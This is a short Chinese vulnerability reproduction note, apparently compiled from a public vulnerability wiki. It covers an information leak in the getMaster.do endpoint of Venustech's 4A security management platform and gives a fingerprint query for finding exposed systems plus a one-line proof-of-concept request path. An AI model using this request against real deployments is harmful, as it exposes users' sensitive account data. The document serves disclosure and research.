---
title: "启明星辰 4A统一安全管控平台 getMaster.do 信息泄漏漏洞"
date: 2026-10-18 09:15:54
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "启明星辰"
tags:
  - "启明星辰"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

启明星辰 4A统一安全管控平台 getMaster.do 接口存在信息泄漏漏洞，通过发送特定请求包可以获取用户敏感信息

## 漏洞影响

启明星辰 4A统一安全管控平台

## 网络测绘

web.body="cas/css/ace-part2.min.css"

## 漏洞复现

登陆页面

![image-20230828144032254](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828144032254.png)

验证POC

```
/accountApi/getMaster.do
```

![image-20230828144049975](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828144049975.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0-4A%E7%BB%9F%E4%B8%80%E5%AE%89%E5%85%A8%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0-getMaster.do-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
